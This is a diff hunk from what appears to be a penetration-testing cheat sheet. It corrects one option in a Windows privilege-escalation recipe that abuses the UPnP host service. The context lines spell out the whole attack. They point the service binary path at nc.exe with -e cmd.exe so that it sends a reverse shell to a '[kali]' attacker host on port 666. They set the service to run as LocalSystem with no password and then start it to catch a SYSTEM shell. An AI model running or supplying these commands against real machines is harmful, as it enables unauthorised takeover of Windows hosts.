@@ -743,7 +743,7 @@ Windows SP0/SP1 UPNPHOST/SSDPSRV privilege escalation
 cmd> sc qc upnphost
 cmd> sc config upnphost binpath= "C:\temp\nc.exe [kali] 666 -e cmd.exe" # set binpath to nc payload
 cmd> sc config upnphost obj= ".\LocalSystem" password= ""               # load as system with no pwd
-cnd> sc config upnphost dependencies= ""                                # remove dependnecies (SSDPSRV)
+cnd> sc config upnphost depend= ""                                # remove dependnecies (SSDPSRV)
 cmd> net start upnphost                                                 # start service + catch reverse shell
 ```
 
